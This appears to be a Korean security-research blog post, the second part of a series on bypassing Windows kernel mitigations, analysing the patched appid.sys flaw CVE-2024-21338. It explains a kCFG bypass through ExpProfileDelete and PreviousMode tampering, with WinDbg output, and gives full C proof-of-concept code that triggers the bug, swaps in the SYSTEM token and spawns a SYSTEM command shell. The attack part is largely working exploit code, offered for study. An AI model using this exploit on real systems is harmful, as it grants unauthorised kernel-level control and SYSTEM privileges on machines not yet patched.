---
title: "[Research] Bypassing Windows Kernel Mitigations: Part1 - Overview (Ko)"
author: L0ch
tags: [L0ch, windows, kernel, mitigation, previousmode, smep, kcfg, dep, bypass, exploit techniques, cve-2024-21338, sedebugprivilege, ioring]
categories: [Research]
date: 2025-01-12 19:00:00
cc: false
index_img: 2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image.png
---


[Bypassing Windows Kernel Mitigations: Part1 - Overview](https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/)

**Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 ← Now**

---

안녕하세요, L0ch입니다!

지난 달 Windows Kernel Mitigation을 소개하는 Part 1에 이어 Part 2로 돌아왔습니다. 이번 파트부터는 kCFG 우회에  대해 알아볼건데요, 2024년 2월에 패치되었던 appid.sys의 Local Privilege Escalation 취약점 CVE-2024-21338을 분석하며 kCFG를 우회하는 세 가지 post-exploitation technique에 대해 소개하겠습니다

## CVE-2024-21338 - appid.sys Untrusted Pointer Dereference

> 취약점 분석 및 exploit은 Windows 23H2 build 22631.2861 (2023년 12월 누적 업데이트 적용 버전) 에서 진행했습니다.
> 

CVE-2024-21338 취약점 자체는 간단합니다! 

![image.png](ko/image%201.png)

appid.sys 드라이버가 유저모드로부터 온 I/O Reqeust를 처리하는 과정에서, IOCTL Code가 `0x22A018`인 경우 `AipSmartHashImageFile` 함수를 유저모드 버퍼인 SystemBuffer를 함께 전달하여 호출합니다.

![image.png](ko/image%202.png)

`AipSmartHashImageFile` 함수는 이후 `AppHashComputeFileHashesInternal`, `AppHashComputeImageHashInternal` 함수 호출 체인을 통해 최종적으로 `AppHashComputeImageHashInternal` 함수에서 `SystemBuffer+0x16` 오프셋의 포인터를 호출합니다. 

![image.png](ko/image%203.png)

유저모드에서 제어 가능한 SystemBuffer를 커널 컨텍스트에서 호출하므로, 유저는 임의의 콜백 포인터를 커널모드로 호출할 수 있게 됩니다.(빨간색 박스) 거기에, 첫 번째 인자인 rcx를 참조하는 주소(파란색 박스) 까지 제어할 수 있죠.

자세한 분석 및 PoC는 아래 레퍼런스 링크를 참고해주세요!

- [https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp](https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp)
- [https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/](https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/)

이제 원하는 함수를 호출할 수 있게 됐지만, 유저모드에 구성한 쉘코드나 ROP 가젯 등을 활용할 수는 없습니다.  [part1](https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/#kCFG-Kernel-Control-Flow-Guard)에서 설명했듯이

- CPU가 Supervisor Mode(ring 0) 권한 상태에서 유저랜드(ring 3)의 코드를 실행할 수 없도록 하는 SMEP
- 비트맵에 등록된 커널 주소가 아니면 예외를 throw해 `KERNEL_SECURITY_CHECK_FAILURE` 를 발생시키는 kCFG

위 두 가지의 mitgation의 존재 때문이죠. SMEP은 bypass 가젯의 주소를 호출해 우회한다고 해도 결국 유저모드 코드이기 때문에 kCFG에서 막혀버리게 됩니다.

Token Swapping을 통한 권한 상승이 주요 목적인 커널 Exploit은 커널 메모리의 읽기 쓰기 권한을 얻는 것이 중요한데요, kCFG를 만족하는 커널 함수 호출로 Full Arbitrary Kernel Read/Write 프리미티브를 얻을 수 있는 세 가지 Exploit Tech이 있습니다.

1. PreviousMode
2. SeDebugPrigvileges
3. I/O Ring Buffer

~~이번 파트에서는 위 세 가지 기법을 소개하겠습니다~~ 마감 이슈로,, 이번 파트에서는 PreviouMode를 이용한 exploit만 소개하고, 다음 파트에서 SeDebugPrivileges와 I/O Ring Buffer를 이용한 Exploit을 다뤄보도록 할게요!

![image.png](ko/image%204.png)

## EXP 1 - PreviousMode

첫 번째는 PreviousMode 변조를 이용한 방법입니다.

[PreviousMode](https://learn.microsoft.com/ko-kr/windows-hardware/drivers/kernel/previousmode)는 KTHREAD 구조체 필드로, 유저모드 애플리케이션이 **Nt** 또는 **Zw** 버전의 네이티브 시스템 서비스 루틴을 호출한 경우 스레드의 매개변수가 유저모드 프로세스로부터 왔음을 알리는 플래그 값입니다. PreviousMode 값이 1이면 현재 스레드 객체가 유저모드로부터 호출되어 생성되었고, 0이면 커널모드로부터 생성되었음을 알 수 있죠. 이는 유저모드로부터 온 객체의 커널 접근을 제한하는 역할을 합니다. 

유저모드 프로세스의 PrevousMode를 0으로 변조할 수 있으면 `NtWriteVirtualMemory`나 `ReadProcessMemory` 함수를 호출해 커널 메모리 RW 프리미티브를 얻을 수 있는데요, 이해를 돕기 위한 간단한 예제와 디버깅을 통해 알아볼게요!

```c
#include <stdio.h>
#include "defines.h"

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;

void GetNtFunction() {...}
PVOID GetObj(PULONGLONG objptr, ULONG pid, HANDLE handle){...}

int main() {
	PVOID KTHREAD = NULL;
	PVOID SYSTEM_EPROCESS = NULL;
	PVOID EPROCESS = NULL;

	ULONG dwbytes = 0;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();
	
	// [1]
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&KTHREAD, pid, hThread);
	printf("[+] Current KTHREAD: %p\n", KTHREAD);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&EPROCESS, pid, hProc);
	printf("[+] Current EPROCESS: %p\n", EPROCESS);

	GetObj(&SYSTEM_EPROCESS, 4, (HANDLE)4);
	printf("[+] System EPROCESS: %p\n", SYSTEM_EPROCESS);

	printf("modify previousmode in windbg and press any button..\n");
	getch();

	// [2]
	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + 0x4b8 , (ULONGLONG)SYSTEM_EPROCESS + 0x4b8, sizeof(ULONGLONG), &dwbytes);

	// [3]
	system("cmd.exe");
	
}
```

> 전체 소스코드 : [https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c](https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c)
> 

위 코드는 다음과 같이 동작합니다.

1.  `NtQuerySystemInformation` API를 통해 필요한 주소 leak 
2. 유저모드 프로세스의 토큰값을 시스템 프로세스로 overwrite
3. 시스템 권한의 cmd 스폰

정상적인 실행이라면 유저모드 프로세스는 `pNtWriteVirtualMemory`를 통해 커널 메모리 RW가 불가능하기 때문에 아무 일도 발생하지 않습니다..만! 우린 이제 `pNtWriteVirtualMemory`호출 전 디버거에서 PreviouMode를 수정하고 권한 상승을 할겁니다.

![image.png](ko/image%205.png)

실행하면 현재 프로세스의 KTHREAD/EPROCESS 주소와 SYSTEM 프로세스 EPROCESS 주소를 출력합니다. 이걸 복사해두고 windbg로 갑니다.

```c
2: kd> dt _KTHREAD FFFFDC0FC3780080
nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x8ad5b1e
   +0x028 InitialStack     : 0xfffff500`166f7c30 Void
   +0x030 StackLimit       : 0xfffff500`166f1000 Void
   +0x038 StackBase        : 0xfffff500`166f8000 Void
   +0x040 ThreadLock       : 0
   +0x048 CycleTime        : 0x4bf645c
   +0x050 CurrentRunTime   : 0
   +0x054 ExpectedRunTime  : 0xbe0b
   +0x058 KernelStack      : 0xfffff500`166f7000 Void
   +0x060 StateSaveArea    : 0xfffff500`166f7c80 _XSAVE_FORMAT
...
   +0x220 Process          : 0xffffdc0f`c39640c0 _KPROCESS
   +0x228 UserAffinity     : 0xffffdc0f`c3780a68 _KAFFINITY_EX
   +0x230 UserAffinityPrimaryGroup : 0
   +0x232 PreviousMode     : 1 ''
   +0x233 BasePriority     : 8 ''
```

![image.png](ko/image%206.png)

`KTHREAD+0x232` 위치에 PreviouMode가 위치한 것을 확인할 수 있습니다. 현재 프로세스는 유저모드이니 PreviouMode가 1인 것을 확인할 수 있네요. 이제 windbg의 Memory 창에서 해당 값을 0으로 수정합니다.

![image.png](ko/image%207.png)

```c
2: kd> dt _KTHREAD FFFFDC0FC3780080
nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x8ad5b1e
   +0x028 InitialStack     : 0xfffff500`166f7c30 Void
   +0x030 StackLimit       : 0xfffff500`166f1000 Void
   +0x038 StackBase        : 0xfffff500`166f8000 Void
   +0x040 ThreadLock       : 0
   +0x048 CycleTime        : 0x4bf645c
   +0x050 CurrentRunTime   : 0
   +0x054 ExpectedRunTime  : 0xbe0b
   +0x058 KernelStack      : 0xfffff500`166f7000 Void
   +0x060 StateSaveArea    : 0xfffff500`166f7c80 _XSAVE_FORMAT
...
   +0x220 Process          : 0xffffdc0f`c39640c0 _KPROCESS
   +0x228 UserAffinity     : 0xffffdc0f`c3780a68 _KAFFINITY_EX
   +0x230 UserAffinityPrimaryGroup : 0
   +0x232 PreviousMode     : 0 ''
   +0x233 BasePriority     : 8 ''
```

다시 분석 머신으로 돌아와 아무 버튼이나 누르면 다음 스텝을 진행합니다. 

```c
pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + 0x4b8 , (ULONGLONG)SYSTEM_EPROCESS + 0x4b8, sizeof(ULONGLONG), &dwbytes);
system("cmd.exe")
```

PreviousMode 변조를 통해 `pNtWritevirtualMemory` 함수로 커널 Read/Write가 가능해졌습니다. 시스템 EPROCESS의 Token으로 Token Swapping을 한 뒤 cmd 프로세스를 실행하면 NT AUTORITY\SYSTEM 권한의 cmd가…!

![image.png](ko/image%208.png)

?

![image.png](ko/image%209.png)

BSOD가 떠버렸네요.. ??

문제는 PreviousMode를 커널모드로 변조한 뒤 시스템 권한으로 프로세스를 생성하려고 할 때 발생합니다. Token Swapping을 한 이후에는 커널모드 PreviousMode가 필요 없으니 cmd 프로세스 생성 전에 원래 값인 1로 복원하는 과정이 있어야 크래시가 발생하지 않고 프로세스를 생성할 수 있습니다.

```c
	char* restoreBuffer = (char*)malloc(sizeof(CHAR));
	*restoreBuffer = 1;
	
	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + 0x232, (PVOID)restoreBuffer, sizeof(CHAR), &dwbytes);
	system("cmd.exe");
```

위 코드를 추가해 다시 해보면..

![image.png](ko/image%2010.png)

이렇게 PreviousMode 변조로 권한 상승을 달성할 수 있습니다.

다시 kCFG 우회로 돌아와서, CVE-2024-21338의 untrusted pointer dereference 취약점 트리거 후 kCFG 비트맵에 등록된 정상적인 커널 함수를 호출하면 PreviouMode를 변조할 수 있겠죠. 근데.. 많고 많은 커널 함수 중 이런 함수는 어떻게 찾아야 할까요 :(

주목해볼만한 함수 중 `ObfDereferenceObjectWithTag` 커널 매크로가 있습니다. 해당 매크로는 전달되는 오브젝트 주소의 레퍼런스 카운트 필드(오프셋 -0x30) 를 감소시키므로 PreviousMode의 유저모드 값인 1에서 커널모드 값인 0으로 변조하기 딱 좋은 매크로가 되겠네요.

그러나 `ObfDereferenceObjectWithTag` 을 바로 호출하기에는 한 가지 제약사항이 존재합니다. 아까 버그 트리거 시점에서 확인했던 것처럼 첫 번째 인자 값을 직접 제어할 수는 없고, 인자가 참조하는 값만 간접적으로 제어할 수 있다는 것이죠.

![image.png](ko/image%203.png)

rcx를 한 번 참조한 값을 `ObfDereferenceObjectWithTag` 매크로의 인자로 전달해 우리가 직접 제어 가능하도록 하는  wrapper 함수를 또 찾아야 합니다.

`ObfDereferenceObjectWithTag` 매크로의 크로스 레퍼런스 리스트를 쭉 찾아보면 해당 조건을 만족하는 `ExpProfileDelete` 함수가 있습니다.

```lua
void __fastcall ExpProfileDelete(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 48) )
  {
    KeStopProfile(*(_QWORD *)(a1 + 40));
    MmUnmapLockedPages(*(PVOID *)(a1 + 48), *(PMDL *)(a1 + 56));
    MmUnlockPages(*(PMDL *)(a1 + 56));
    ExFreePoolWithTag(*(PVOID *)(a1 + 40), 0);
  }
  if ( *(_QWORD *)a1 )
    ObfDereferenceObjectWithTag(*(PVOID *)a1, 0x66507845u);
}
```

첫 번째 인자를 참조한 값을 `ObfDereferenceObjectWithTag`로 전달해 호출하네요. 이러면 매크로의 첫 번째 인자를 우리가 직접 컨트롤할 수 있습니다. 

![image.png](ko/image%2011.png)

우선 CVE-2024-21338 취약점을 통해 `ExpProfileDelete` 함수를 호출하면 kCFG가 우회되고 `ExpProfileDelete` 주소로 점프합니다.

> `ExpProfileDelete` 함수 주소는 Part 1의 `NtQuerySystemInformation` 를 통해 구한 ntoskrnle.exe 베이스와 오프셋 계산을 통해 구할 수 있습니다.
> 

![image.png](ko/image%2012.png)

`ExpProfileDelete` 내에서 `ObfDereferenceObjectWithTag` 매크로 호출 시점의 rcx가 `0x4141414141414141`로 나오네요. 드디어 우리가 원하는 주소를 감소시킬 수 있습니다!

`ExpProfileDelete` 가 아니더라도 조건을 만족하는 함수는 더 있을 수 있습니다. 단, 함수의 로직이 복잡할수록 우리가 의도한 동작 외 다른 코드를 실행하며 크래시가 발생할 가능성이 높아집니다. 때문에 비교적 간단한 함수를 타겟으로 찾는 것이 좋을 것 같네요.

아래는 CVE-2024-21338 취약점으로 PreviousMode를 변조하고 Token Swapping을 수행하는 최종 PoC 코드입니다

```c
#include <stdio.h>
#include "defines.h"

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define DEVICE_NAME "\\\\?\\AppID"

// IOCTL 0x22A018
typedef struct {
	PVOID arg1;
	PVOID objptr;
	PVOID cfgptr;
	PVOID unknown;
} INPUT_BUFFER;

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;
_NtDeviceIoControlFile pNtDeviceIoControlFile;

void GetNtFunction() {...}
PVOID GetImageBase(const char* ModuleName) {...}
PVOID GetFILE_OBJECT_Address(){...}
PVOID GetObj(PULONGLONG objptr, ULONG pid, HANDLE handle){...}

int main() {
	PVOID KTHREAD = NULL;
	PVOID SYSTEM_EPROCESS = NULL;
	PVOID EPROCESS = NULL;
	PVOID PreviousMode = NULL;
	PVOID NTOSKRNL_BASE = NULL;

	ULONG dwbytes = 0;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&KTHREAD, pid, hThread);
	printf("[+] Current KTHREAD: %p\n", KTHREAD);

	PreviousMode = (UINT64)KTHREAD + 0x232;
	printf("[+] PreviousMode address: %p\n", PreviousMode);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&EPROCESS, pid, hProc);
	printf("[+] Current EPROCESS: %p\n", EPROCESS);

	GetObj(&SYSTEM_EPROCESS, 4, (HANDLE)4);
	printf("[+] System EPROCESS: %p\n", SYSTEM_EPROCESS);

	NTOSKRNL_BASE = GetImageBase("ntoskrnl.exe");
	printf("[+] ntoskrnl.exe base address : %p\n", NTOSKRNL_BASE);

	PVOID ExpProfileDelete = (UINT64)NTOSKRNL_BASE + 0xA01FD0; // kcfg bypass gadget
	printf("[+] ExpProfileDelete function address : %p\n", ExpProfileDelete);

	PVOID FILE_OBJECT = GetFILE_OBJECT_Address();

	INPUT_BUFFER buffer = { 0, };
	HANDLE dHandle;
	dHandle = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, 0, NULL);

	buffer.arg1 = (UINT64)PreviousMode + 0x30;		
	buffer.objptr = FILE_OBJECT;					
	buffer.cfgptr = &ExpProfileDelete;				
	buffer.unknown = NULL;							

	IO_STATUS_BLOCK ioStatus;

	if (pNtDeviceIoControlFile(dHandle, NULL, NULL, NULL, &ioStatus, 0x22A018, &buffer, sizeof(buffer), NULL, &dwbytes) != NOERROR) {
		printf("NtDeviceIoControlFile Failed, 0x%x\n", GetLastError());
	}

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + 0x4b8, (ULONGLONG)SYSTEM_EPROCESS + 0x4b8, sizeof(ULONGLONG), &dwbytes);

	char* restoreBuffer = (char*)malloc(sizeof(CHAR));
	*restoreBuffer = 1;

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + 0x232, (PVOID)restoreBuffer, sizeof(CHAR), &dwbytes);

	system("cmd.exe");

	return 0;
}
```

> 전체 소스코드: [https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c](https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c)
> 

![image.png](ko/image%2013.png)

원래 이번 파트에서 세 가지 기법을 모두 소개하려고 했지만.. 생각보다 길어진 관계로 다음 파트에서 남은 두 가지 기법에 대해 정리하겠습니다 ㅎㅎ.. (괜찮아 나한텐 설 연휴가 있어)

그럼 Part 3로 다시 찾아오겠습니다 :) 2025년에도 우리 열심히 공부해요